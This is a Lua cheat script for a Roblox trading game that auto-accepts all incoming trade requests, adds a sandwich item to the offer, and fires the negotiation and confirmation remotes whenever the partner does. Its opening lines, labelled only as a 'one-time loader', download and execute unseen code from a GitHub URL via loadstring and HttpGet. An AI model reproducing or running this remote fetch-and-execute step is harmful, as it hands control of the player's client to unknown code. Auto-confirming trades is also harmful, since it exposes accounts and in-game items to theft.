-- One-time loader (runs once when script starts)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/miniaviation/Adopcasi/refs/heads/main/itemdepodetection"))()
end)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- API Remotes
local API = ReplicatedStorage:WaitForChild("API")
local TradeRequestReceived = API:WaitForChild("TradeAPI/TradeRequestReceived")
local AcceptOrDecline = API:WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
local AddItemToOffer = API:WaitForChild("TradeAPI/AddItemToOffer")
local AcceptNegotiation = API:WaitForChild("TradeAPI/AcceptNegotiation")
local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")

local Fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
local ClientData = Fsys.load("ClientData")

local ITEM_KIND = "sandwich-default"

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TradeAcceptGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 75)
frame.Position = UDim2.new(0.5, -150, 0, -90)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Parent = screenGui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(100, 220, 120)
stroke.Thickness = 2

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, -16, 0.6, 0)
label.Position = UDim2.new(0, 8, 0.05, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(100, 220, 120)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextXAlignment = Enum.TextXAlignment.Left

local timeLabel = Instance.new("TextLabel", frame)
timeLabel.Size = UDim2.new(1, -16, 0.35, 0)
timeLabel.Position = UDim2.new(0, 8, 0.62, 0)
timeLabel.BackgroundTransparency = 1
timeLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
timeLabel.TextScaled = true
timeLabel.Font = Enum.Font.Gotham
timeLabel.TextXAlignment = Enum.TextXAlignment.Left

local isShowing = false
local function showNotif(text)
    label.Text = text
    timeLabel.Text = "At " .. os.date("%H:%M:%S")
    if isShowing then return end
    isShowing = true
    TweenService:Create(frame, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -150, 0, 20)
    }):Play()
    task.wait(4)
    TweenService:Create(frame, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
        Position = UDim2.new(0.5, -150, 0, -90)
    }):Play()
    task.wait(0.35)
    isShowing = false
end

-- Sandwich helpers
local function findSandwichId()
    local ok, inventory = pcall(function()
        return ClientData.get("inventory")
    end)
    if not ok or not inventory or not inventory.food then
        warn("[TradeScript] Could not access inventory.")
        return nil
    end
    for id, item in pairs(inventory.food) do
        if tostring(item.kind) == ITEM_KIND then
            return tostring(id)
        end
    end
    warn("[TradeScript] Sandwich not found in inventory.")
    return nil
end

-- Auto-accept incoming trade requests and add sandwich
print("[TradeScript] Ready — auto accepting all trades and adding Sandwich.")
TradeRequestReceived.OnClientEvent:Connect(function(sender)
    if not sender then return end
    print("[TradeScript] Trade request from: " .. tostring(sender.Name))
    task.wait(0.5)

    local ok1, err1 = pcall(function()
        AcceptOrDecline:InvokeServer(sender, true)
    end)
    if not ok1 then
        warn("[TradeScript] Failed to accept: " .. tostring(err1))
        return
    end
    print("[TradeScript] Accepted trade with: " .. sender.Name)
    task.wait(0.5)

    local itemId = findSandwichId()
    if not itemId then
        warn("[TradeScript] No sandwich found — skipping offer.")
        return
    end
    task.wait(0.3)

    local ok2, err2 = pcall(function()
        AddItemToOffer:FireServer(itemId)
    end)
    if ok2 then
        print("[TradeScript] Sandwich added to offer! ID: " .. itemId)
    else
        warn("[TradeScript] Failed to add sandwich: " .. tostring(err2))
    end
end)

-- Per-trade state tracking
local lastTradeId = nil
local lastPartnerNegotiated = false
local lastPartnerConfirmed = false
local firedAcceptThisTrade = false
local firedConfirmThisTrade = false

ClientData.register_callback_plus_existing("trade", function(_, newState)
    -- Trade ended — full reset
    if newState == nil then
        lastTradeId = nil
        lastPartnerNegotiated = false
        lastPartnerConfirmed = false
        firedAcceptThisTrade = false
        firedConfirmThisTrade = false
        return
    end

    -- New trade started — reset per-trade flags
    if newState.trade_id ~= lastTradeId then
        lastTradeId = newState.trade_id
        lastPartnerNegotiated = false
        lastPartnerConfirmed = false
        firedAcceptThisTrade = false
        firedConfirmThisTrade = false
    end

    local isLocalSender = newState.sender == LocalPlayer
    local partnerOffer = isLocalSender and newState.recipient_offer or newState.sender_offer
    local partner = isLocalSender and newState.recipient or newState.sender

    if not partnerOffer or not partner then return end

    local partnerNegotiated = partnerOffer.negotiated == true
    local partnerConfirmed  = partnerOffer.confirmed  == true

    -- Stage 1: Partner accepted negotiation → fire AcceptNegotiation
    if partnerNegotiated and not lastPartnerNegotiated and not firedAcceptThisTrade then
        lastPartnerNegotiated = true
        firedAcceptThisTrade = true

        task.spawn(showNotif, "✅ " .. partner.Name .. " accepted!")

        local ok, err = pcall(function()
            AcceptNegotiation:FireServer()
        end)
        if ok then
            print("[TradeScript] AcceptNegotiation fired.")
        else
            warn("[TradeScript] Failed to fire AcceptNegotiation: " .. tostring(err))
        end

    elseif not partnerNegotiated then
        lastPartnerNegotiated = false
        firedAcceptThisTrade = false
    end

    -- Stage 2: Partner confirmed → fire ConfirmTrade
    if partnerConfirmed and not lastPartnerConfirmed and not firedConfirmThisTrade then
        lastPartnerConfirmed = true
        firedConfirmThisTrade = true

        task.spawn(showNotif, "🤝 " .. partner.Name .. " confirmed!")

        local ok, err = pcall(function()
            ConfirmTrade:FireServer()
        end)
        if ok then
            print("[TradeScript] ConfirmTrade fired.")
        else
            warn("[TradeScript] Failed to fire ConfirmTrade: " .. tostring(err))
        end

    elseif not partnerConfirmed then
        lastPartnerConfirmed = false
    end
end)
